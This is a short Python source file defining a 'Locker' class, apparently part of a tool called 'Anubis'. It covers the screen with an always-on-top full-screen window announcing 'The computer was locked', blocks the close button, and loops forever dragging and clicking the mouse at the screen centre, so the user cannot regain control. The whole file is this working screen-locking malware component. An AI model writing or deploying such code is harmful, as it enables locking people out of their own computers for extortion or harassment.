from tkinter import *
from pyautogui import *


class Locker:
    def __init__(self):
        pass

    def draw(self, label_text):
        self.run = True
        self.root = Tk()
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root['bg'] = "#000"
        self.titleLabel = Label(self.root,
                                text=f"░▒▓█Anubis█▓▒░\n    ______    \nThe computer was locked\n{label_text}",
                                font=("Courier", 60), bg="#000",
                                fg="#0ff516")
        self.titleLabel.place(relx=.5, rely=.5, anchor="center")
        self.root.update()
        while True:
            self.on_closing()

    def on_closing(self):
        if self.run:
            try:
                self.root.attributes("-fullscreen", True)
                self.root.attributes("-topmost", True)
                self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
                moveTo(self.root.winfo_screenwidth() // 2, self.root.winfo_screenheight() // 2)
                click(self.root.winfo_screenwidth() // 2, self.root.winfo_screenheight() // 2)
                self.root.update()
            except Exception as e:
                 print(e)
        else:
            sys.exit()

    def exit(self, event):
        self.run = False
